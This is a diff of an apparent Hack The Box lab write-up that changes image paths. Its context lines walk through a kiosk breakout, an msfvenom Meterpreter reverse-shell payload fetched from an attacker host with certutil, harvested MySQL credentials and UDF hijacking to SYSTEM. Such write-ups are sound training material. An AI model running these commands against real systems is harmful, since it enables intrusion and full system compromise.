@@ -26,13 +26,13 @@ The login page did not show anything useful at first glance, so Ffuf was used, a
 
 |   |
 |---|
-|ffuf -u http://10.129.71.63:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios.png>)|
+|ffuf -u http://10.129.71.63:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios.png)|
 
 This discovered a /api path that returned a 403 error (forbidden). A 403 is actually a good sign: it means the path exists, even if it is protected. Enumeration continued under /api and a /api/status path appeared.
 
 When visiting /api/status without needing to log in, the server returned device information, including its serial number: NX-DH-2024-B7042. This is a typical security flaw: an endpoint that should be protected but is not, and that leaks sensitive data.
 
-![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%201.png>)
+![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%201.png)
 
 # 2. Initial Access (Foothold)
 
@@ -40,7 +40,7 @@ When visiting /api/status without needing to log in, the server returned device 
 
 The login screen had a "forgot password" hint that said the device's default password is its own serial number. Using the serial number leaked in the previous step (NX-DH-2024-B7042), it was possible to log directly into the DeviceHub panel.
 
-![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%202.png>)
+![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%202.png)
 
 Inside the panel, a pair of credentials appeared: KioskUser / K!0sk2026#, along with controls to turn the scanner and printer on and off.
 
@@ -50,15 +50,15 @@ With that credential, it was possible to connect via RDP (Remote Desktop). But i
 
 Following the normal kiosk flow (choose language, search for the reservation with the locator KS7X2M and the last name Crawford), a document verification step (passport) was reached. When clicking "scan", an error appeared.
 
-![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%203.png>)
+![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%203.png)
 
-## ![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%204.png>)
+## ![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%204.png)
 
 ## 2.3 Forcing a Scanner Error
 
 Remembering that the DeviceHub panel allows turning off the physical scanner, it was turned off from there. Returning to the kiosk and repeating the process, the scan failed again, but this time with a different and more revealing error message: it included a clickable link. Clicking it opened a full browser window, outside the restricted kiosk mode.
 
-![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%205.png>)
+![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%205.png)
 
 _Note: This is an example of "kiosk breakout": exploiting an application flaw (a poorly managed error message) to escape the restricted environment and reach a normal Windows browser._
 
@@ -68,13 +68,13 @@ Once with a real browser open, the Ctrl+O (Open file) shortcut was used, which s
 
 |                                                                                                                                                |
 | ---------------------------------------------------------------------------------------------------------------------------------------------- |
-| C:\Windows\System32\cmd.exe<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%206.png>) |
+| C:\Windows\System32\cmd.exe<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%206.png) |
 
 This made the file selector download a copy of cmd.exe. Opening that downloaded file obtained an interactive command console, running as the user KIOSK-042\KioskUser.
 
 |   |
 |---|
-|whoami<br><br>? kiosk-042\kioskuser<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%207.png>)|
+|whoami<br><br>? kiosk-042\kioskuser<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%207.png)|
 
 ## 2.5 User Flag
 
@@ -92,7 +92,7 @@ On the attacker's machine (Kali), the malicious executable was generated and ser
 
 |   |
 |---|
-|msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.190 LPORT=4445 -f exe -o /tmp/share/shell.exe<br><br>python3 -m http.server 8000<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%208.png>)|
+|msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.190 LPORT=4445 -f exe -o /tmp/share/shell.exe<br><br>python3 -m http.server 8000<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%208.png)|
 
 In parallel, a "listener" was set up with Metasploit, which is the process that waits for the victim machine to connect back:
 
@@ -104,7 +104,7 @@ Back on the victim machine, using the already obtained cmd.exe console, that pay
 
 |   |
 |---|
-|certutil -urlcache -split -f http://10.10.15.190:8000/shell.exe shell.exe<br><br>shell.exe<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%209.png>)|
+|certutil -urlcache -split -f http://10.10.15.190:8000/shell.exe shell.exe<br><br>shell.exe<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%209.png)|
 
 This opened a Meterpreter session as KIOSK-042\KioskUser: a much more comfortable and powerful connection than the previous console.
 
@@ -138,7 +138,7 @@ Note title: Untitled
 
 |   |
 |---|
-|type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%2010.png>)|
+|type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2010.png)|
 
 This file contains a default configuration used when the file C:\ProgramData\HTB Airways\db-config.ini doesn't exist:
 
@@ -150,7 +150,7 @@ With these credentials, it was possible to directly query the staff table:
 
 |   |
 |---|
-|mysql -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%2011.png>)|
+|mysql -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2011.png)|
 
 # 5. Privilege Escalation
 
@@ -160,7 +160,7 @@ Before proceeding, it's useful to check the current user's privileges and group 
 
 |   |
 |---|
-|whoami /priv<br><br>whoami /groups<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%2012.png>)|
+|whoami /priv<br><br>whoami /groups<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2012.png)|
 
 ## 5.2 Find a Higher-Privileged MySQL Account
 
@@ -170,19 +170,19 @@ An initial attempt to log in as root without a password failed ("Access denied, 
 
 |   |
 |---|
-|dir "C:\ProgramData\HTB Airways" /s /b<br><br>type "C:\ProgramData\HTB Airways\db-config.ini"<br><br>findstr /si password C:\MySQL\*.ini C:\MySQL\*.cnf<br><br>findstr /si password "C:\Program Files\MySQL\*.ini" "C:\Program Files\MySQL\*.cnf" 2>nul<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%2013.png>)|
+|dir "C:\ProgramData\HTB Airways" /s /b<br><br>type "C:\ProgramData\HTB Airways\db-config.ini"<br><br>findstr /si password C:\MySQL\*.ini C:\MySQL\*.cnf<br><br>findstr /si password "C:\Program Files\MySQL\*.ini" "C:\Program Files\MySQL\*.cnf" 2>nul<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2013.png)|
 
 We also checked MySQL's own configuration folder for a root password or my.ini file:
 
 |   |
 |---|
-|dir C:\MySQL /s /b \| findstr /i "ini cnf"<br><br>type C:\MySQL\my.ini<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%2014.png>)|
+|dir C:\MySQL /s /b \| findstr /i "ini cnf"<br><br>type C:\MySQL\my.ini<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2014.png)|
 
 Next, we verified the actual privileges of the kiosk_app account, specifically whether it (or any other accessible account) had the FILE privilege and write access to the internal mysql.func table:
 
 |   |
 |---|
-|mysql -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -e "SHOW GRANTS FOR CURRENT_USER();"<br><br>mysql -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%2015.png>)|
+|mysql -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -e "SHOW GRANTS FOR CURRENT_USER();"<br><br>mysql -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2015.png)|
 
 This confirmed that kiosk_app only has privileges on the htb_airways database, with no global FILE privilege and no access to mysql.user. In other words: this account isn't suitable for the UDF hijacking attack. We needed a more privileged account.
 
@@ -192,13 +192,13 @@ Returning to the C:\ProgramData\HTB Airways folder, there were three other unloc
 
 |   |
 |---|
-|type "C:\ProgramData\HTB Airways\db-sync-replica.ps1"<br><br>type "C:\ProgramData\HTB Airways\refresh-dates.bat"<br><br>type "C:\ProgramData\HTB Airways\refresh-dates.sql"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%2016.png>)|
+|type "C:\ProgramData\HTB Airways\db-sync-replica.ps1"<br><br>type "C:\ProgramData\HTB Airways\refresh-dates.bat"<br><br>type "C:\ProgramData\HTB Airways\refresh-dates.sql"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2016.png)|
 
 Within these files, we found the MySQL root password: HTB@irw4ys_DB!2026. With full root access, we confirmed its privileges:
 
 |   |
 |---|
-|mysql -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%2017.png>)|
+|mysql -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2017.png)|
 
 As expected, root had File_priv = Y (meaning it has the FILE privilege). With this confirmed, we could proceed with the UDF hijacking technique.
 
@@ -210,7 +210,7 @@ First, we checked if this plugin directory was writable using icacls (which show
 
 |   |
 |---|
-|icacls "C:\MySQL\lib\plugin"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%2018.png>)|
+|icacls "C:\MySQL\lib\plugin"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2018.png)|
 
 The result showed that the group NT AUTHORITY\Authenticated Users had (I)(M) permission, meaning Modify. And since KioskUser belongs to that group, the plugin directory was writable by the attacker.
 
@@ -218,14 +218,14 @@ Normally, to upload the file we'd use MySQL itself with the SQL command INTO OUT
 
 |   |
 |---|
-|ls -la /usr/share/metasploit-framework/data/exploits/mysql/<br><br>find / -iname "*mysqludf*" 2>/dev/null<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%2019.png>)|
+|ls -la /usr/share/metasploit-framework/data/exploits/mysql/<br><br>find / -iname "*mysqludf*" 2>/dev/null<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2019.png)|
 |upload /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll"|
 
 With the DLL in place, we created the function in MySQL and tested its execution:
 
 |   |
 |---|
-|C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"<br><br>C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](<../Attachments/Writeup_HTB_Touch_Escalada_Privilegios%2020.png>)|
+|C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"<br><br>C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2020.png)|
 
 The result was nt authority\system. From this point onward, every time sys_eval('some_command') is executed within MySQL, that command runs on Windows as SYSTEM: the highest possible privilege level.
 
